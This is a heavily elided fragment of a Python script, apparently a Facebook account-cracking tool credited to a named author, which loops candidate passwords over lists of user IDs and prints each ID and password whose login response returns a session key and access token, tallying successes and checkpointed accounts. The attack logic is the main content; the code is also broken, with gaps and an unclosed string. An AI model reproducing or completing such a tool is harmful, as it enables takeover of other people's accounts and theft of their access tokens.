...
#BD 𝐅𝐚𝐢𝐬𝐚𝐥 𝐇𝐚𝐢𝐝𝐚𝐫𝐲
#FB : https://www.facebook.com/profile.php?id=100074211366139&mibextid=ZbWKwL
...
class Main:
	def __init__(self):
		...
		if syed in ["", " "]:
			...
			os.system('xdg-open https://www.facebook.com/profile.php?id=100074211366139&mibextid=ZbWKwL)
			print("")
			time.sleep(2.0)
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s\033[92;1m[𝑭𝒂𝒊𝒔𝒂𝒍] : %s/%s -> \033[0;92m [ OK:%s ]- \033[0;91m[CP:%s ]"%(B,self.loop, len(self.id), len(self.cp), len(self.ok))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r  \033[1;32m   [𝑭𝒂𝒊𝒔𝒂𝒍] %s | %s\033[1;32m         "%(uid, pw))
